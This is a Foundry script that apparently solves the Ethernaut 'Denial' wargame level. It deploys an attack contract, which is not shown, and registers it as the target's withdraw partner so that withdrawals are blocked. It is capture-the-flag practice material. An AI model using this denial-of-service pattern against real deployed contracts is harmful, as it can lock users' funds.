// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level20.sol";

// ================================================================
// │                        LEVEL 20 - DENIAL                     │
// ================================================================
interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IDenial denial = IDenial(targetContractAddress);

        vm.startBroadcast();
        denial.setWithdrawPartner(address(new AttackContract()));
        vm.stopBroadcast();
    }
}
